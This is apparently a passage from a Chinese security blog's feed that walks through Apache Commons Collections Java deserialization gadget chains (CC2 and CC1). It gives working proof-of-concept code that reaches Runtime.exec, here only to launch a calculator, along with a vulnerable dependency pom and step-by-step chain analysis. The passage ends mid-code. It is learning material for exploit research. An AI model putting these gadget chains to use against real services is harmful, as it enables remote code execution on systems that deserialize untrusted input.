class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>, transformingComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        serialize(priorityQueue);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>       <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>       <span class="hljs-keyword">return</span> o;<br>   &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="问题-没有经过反序列化仍能弹出计算器。"><a href="#问题-没有经过反序列化仍能弹出计算器。" class="headerlink" title="问题 没有经过反序列化仍能弹出计算器。"></a>问题 没有经过反序列化仍能弹出计算器。</h2><p>这里我们可以详细跟一下。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235678.png" alt="QQ截图20220303221145"></p><p>在跟如add之后，这里的size&#x3D;2，然后继续跟进<strong>siftUp（）</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032214484.png" alt="QQ截图20220303221246"></p><p>继续跟进。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235283.png" alt="QQ截图20220303221535"></p><p>继续。然后产生了两次<strong>transform</strong>，执行了两次代码。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032215085.png"></p><p>可以试试<strong>siftUpComparable</strong></p><h2 id="siftUpComparable"><a href="#siftUpComparable" class="headerlink" title="siftUpComparable"></a>siftUpComparable</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032236883.png" alt="QQ截图20220303222405"></p><p>可惜最后跟了一遍，直接没有调用**compare()**。</p><h2 id="破局"><a href="#破局" class="headerlink" title="破局"></a>破局</h2><p>反射！<br>直接后面在给 <strong>PriorityQueue</strong>添加<strong>comparator</strong>参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,transformingComparator);<br></code></pre></td></tr></table></figure><p>这里有个小问题。我一直在forname里面纠结。一直填成这个（java.util.function.Consumer.PriorityQueue），后续在（写poc的页面才看到<code>import java.util.PriorityQueue;</code>，emmm感觉自己有点笨。）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc2Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span> );<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,transformingComparator);<br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>       <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>       <span class="hljs-keyword">return</span> o;<br>   &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cc链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections1</title>
    <link href="/2022/03/03/CommonsCollections1/"/>
    <url>/2022/03/03/CommonsCollections1/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>jdk8u71之后修复了漏洞</strong></p><p>这是我用的版本。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725224.png" alt="QQ截图20220302152210"></p><h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><p><strong>漏洞版本：Apache-Commons-Collections&lt;&#x3D;3.1</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Apache-Commons-Collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725366.png" alt="QQ截图20220302151835"></p><h3 id="sun-reflect-annotation"><a href="#sun-reflect-annotation" class="headerlink" title="sun.reflect.annotation"></a>sun.reflect.annotation</h3><p>这个包我们要自行导入。（对应找到版本）<br><a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip</a></p><p>找到jdk版本，解压缩src.zip<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021539384.png" alt="QQ截图20220302153927"></p><p>然后将下载的压缩包，找到sun文件夹，加入至src。即可。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725733.png" alt="QQ截图20220302153927"></p><p>然后就是在idea中导入。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725699.png" alt="QQ截图20220302154312"></p><p>欧克！<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725960.png" alt="QQ截图20220302154736"></p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">objectInputStream.read<span class="hljs-constructor">Object()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformedMap</span>.</span></span>set<span class="hljs-constructor">Value()</span><br>      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h3 id="transform"><a href="#transform" class="headerlink" title="transform"></a>transform</h3><p>最多的就是这么个东西，进去瞧瞧。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021616758.png" alt="QQ截图20220302161553"></p><p>从上往下看利用链子。（指实现了transform接口的）</p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021622247.png" alt="QQ截图20220302162237"></p><p><strong>传入的数组，在transform方法中，前一次transform函数的返回值，会作为下一次transform函数的object参数输入。</strong></p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725974.png" alt="QQ截图20220302162414"></p><p>给了什么就返回什么。</p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725553.png" alt="QQ截图20220302162610"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725101.png" alt="QQ截图20220302162616"></p><p>这里就比较有意思了。直接利用反射了。而且传入的参数是可以控制的。</p><h3 id="利用invokerTransformer弹个计算器"><a href="#利用invokerTransformer弹个计算器" class="headerlink" title="利用invokerTransformer弹个计算器"></a>利用invokerTransformer弹个计算器</h3><h4 id="复习反射"><a href="#复习反射" class="headerlink" title="复习反射"></a>复习反射</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> aClass.getDeclaredConstructor();<br>declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>aClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(declaredConstructor.newInstance(),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>       <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;).transform(runtime);<br></code></pre></td></tr></table></figure><p>如果看不懂这个为什么这么构造建议多看，上面<code>invokerTransformer</code>的实现方法。或者回去复习反射。</p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725975.png" alt="QQ截图20220302165423"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021648812.png" alt="QQ截图20220302164819"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725010.png" alt="QQ截图20220302164829"></p><p>很有意思，即使是这里用protect保护了此方法，但是还给了另外的实现传入参数方法。这里不就是传入值，然后就会继续调用<code>invokerTransformer</code>。</p><p>相当于传入一个<code>valueTransformer</code>，而这个值我们可以控制，刚好可以传入<strong>invokerTransformer</strong></p><p>构造！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>  <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br>  HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>  TransformedMap.decorate(objectObjectHashMap,<span class="hljs-literal">null</span>,exec);<br></code></pre></td></tr></table></figure><p>但是这里却没有触发<code>checkSetValue</code>方法。</p><h3 id="checkSetValue"><a href="#checkSetValue" class="headerlink" title="checkSetValue"></a>checkSetValue</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021703497.png" alt="QQ截图20220302170322"></p><p>真的巧，只有一处使用了它。去看看。先去训练了。（主要是憋不住尿了。谈了恋爱也要经常锻炼，水了队里好几次训练了。哈哈哈~~）<br>22.13才赶到实验室。<br>继续写吧。<br>继续跟进。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725179.png" alt="QQ截图20220302221426"></p><p>很显然这里要找<code>setValue</code>。这里我们可以注意到，这两类都继承了<code>AbstractInputCheckedMapDecorator</code></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725383.png" alt="QQ截图20220302221854"></p><p>也就是说在使用entry遍历赋值被修饰过的类赋值时，会调用这个方法。而这个父类刚好又是这里的<code>MapEntry</code>的类。真的太巧了。</p><h4 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>      <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br>      HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>      objectObjectHashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>      Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(objectObjectHashMap, <span class="hljs-literal">null</span>, exec);<br>      <span class="hljs-keyword">for</span>(Map.Entry entry:decorate.entrySet())&#123;<br>          entry.setValue(runtime);<br>      &#125;<br><br></code></pre></td></tr></table></figure><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p>记得之前加入的包吗？这里其实就很凑巧。很有意思。刚好<code>AnnotationInvocationHandler</code>里面的<code>readObjetc</code>尽然调用了<code>setValue</code></p><p>而且这个<code>readObject</code>刚好完成了遍历数组的功能。还可以反序列。达到漏洞的效果。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725232.png" alt="QQ截图20220302223706"></p><p>然后看看它的构造函数。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203022239939.png" alt="QQ截图20220302223929"></p><p>这里值得注意<strong>作用域</strong>，之前文章有讲。<br><strong>Annotation</strong>：注解类。<br><strong>memberValues</strong>：可控值。传入<code>decorate</code>。<br>然后我们解决一下<code>AnnotationInvocationHandler</code>中的限制条件。<br><strong>两个<code>if</code>和不可控制的传入<code>setValue</code>的值</strong></p><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031629397.png" alt="QQ截图20220303162858"></p><p><strong>第一个if</strong>：这里就是要找一个注解类，并且有实现方法。</p><p>注解类中两个注解，都实现了<strong>value（）</strong>方法。<br><strong>@Target</strong>和**@Retention**</p><p><strong>第二个if：</strong>判断两个类型是否能够强转</p><h4 id="不可控制的传入setValue的值"><a href="#不可控制的传入setValue的值" class="headerlink" title="不可控制的传入setValue的值"></a>不可控制的传入<code>setValue</code>的值</h4><p>利用<strong>ConstantTransformer</strong>。直接 </p><h3 id="解决Runtime类不可以序列化"><a href="#解决Runtime类不可以序列化" class="headerlink" title="解决Runtime类不可以序列化"></a>解决Runtime类不可以序列化</h3><p>巧的是，Runtime的class是可以序列化的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">runtimeClass</span> <span class="hljs-operator">=</span> Runtime.class;<br><span class="hljs-type">Method</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> runtime.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>exec.invoke(invoke,<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p><code>**Object invoke = runtime.invoke(null, null);**</code><br>相当于是获取到了Runtime这个对象。</p><p>然后就去构造到<strong>invokerTransformer</strong>中去。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> <span 